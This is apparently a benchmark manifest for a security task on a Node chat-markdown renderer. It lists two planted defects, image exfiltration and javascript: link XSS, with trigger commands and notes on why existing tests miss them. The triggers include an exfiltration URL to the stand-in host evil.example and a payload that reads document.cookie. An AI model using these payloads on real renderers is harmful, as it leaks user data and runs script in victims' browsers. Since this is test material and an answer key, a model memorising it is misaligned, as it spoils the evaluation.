@@ -1,0 +1,49 @@
+{
+  "id": "s06-chat-markdown-render",
+  "family": "security",
+  "language": "node",
+  "suite": "node --test",
+  "surface": "library",
+  "defects": [
+    {
+      "id": "D1",
+      "file": "src/render.js",
+      "line": 6,
+      "class": "image-exfiltration",
+      "keywords": [
+        "image",
+        "exfiltration",
+        "external",
+        "src",
+        "auto-load"
+      ],
+      "description": "render() emits <img> for any URL, so a reply containing an external image makes the browser request it as soon as it is inserted, leaking whatever the URL carries.",
+      "trigger": {
+        "input": "node --input-type=module -e 'import {render} from \"./src/render.js\"; console.log(/<img[^>]*src=\"https?:/.test(render(\"![x](https://evil.example/c?d=secret)\")));'",
+        "expected": "false",
+        "actual": "true"
+      },
+      "why_missed": "The image test uses the app's own path; no test renders an image pointing at another site."
+    },
+    {
+      "id": "D2",
+      "file": "src/render.js",
+      "line": 7,
+      "class": "javascript-url-link",
+      "keywords": [
+        "javascript:",
+        "link",
+        "href",
+        "scheme",
+        "xss"
+      ],
+      "description": "render() emits <a> for any URL scheme, so a javascript: link in the reply runs script when clicked.",
+      "trigger": {
+        "input": "node --input-type=module -e 'import {render} from \"./src/render.js\"; console.log(/href=\"javascript:/i.test(render(\"[open](javascript:alert(document.cookie))\")));'",
+        "expected": "false",
+        "actual": "true"
+      },
+      "why_missed": "The link test uses an https URL; the HTML escape stops tags, not URL schemes."
+    }
+  ]
+}
